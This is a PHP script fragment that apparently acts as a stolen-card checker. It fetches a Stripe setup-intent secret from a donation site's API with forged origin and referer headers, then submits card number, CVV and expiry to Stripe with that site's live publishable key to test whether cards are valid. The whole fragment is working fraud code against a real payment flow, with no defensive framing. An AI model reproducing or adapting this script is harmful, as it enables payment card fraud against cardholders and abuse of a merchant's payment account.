...
$var3 = substr($a, 8, 4);
$var4 = substr($a, 12, 4);
$ccc = $var1 . "+" . $var2 . "+" . $var3 . "+" . $var4;

$data = array("paymentMethod" => "card");
$options = array(
  "http" => array(
    "header" => "Content-type: application/json\r\n" .
                "origin: https://dollardonationclub.com\r\n" .
                "referer: https://dollardonationclub.com/\r\n" .
...
$result = file_get_contents("https://api.dollardonationclub.com/v1/stripe/setup", false, $context);

$response = json_decode($result, true);
$client_secret = $response["clientSecret"];
$pi = $response["setupIntentId"];
// echo $client_secret;
...
############################[2 Req]############################
        ...
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[billing_details][address][country]=IN&payment_method_data[type]=card&payment_method_data[card][number]='.$ccc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F025249863%3B+stripe-js-v3%2F025249863%3B+payment-element&payment_method_data[time_on_page]=31368&payment_method_data[guid]=c2ffab3d-1807-4518-b020-0bc7996b5cd62fc12a&payment_method_data[muid]=5eeb637f-ce2c-470a-8ba3-fa7a3bb1cfcfa4b7c5&payment_method_data[sid]=2b33957a-4b51-4f4f-ac8f-49170907cdb43f8acf&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JXXY0GAF2IgwFKMK0qBxsanoGUg4Ypo8KHQuMLg3HC2ioWanZrTeppouQysyKd0ekdecDCB2wSngSvjd5CM3Emj00w6PT9M16&client_secret='.$client_secret.'');
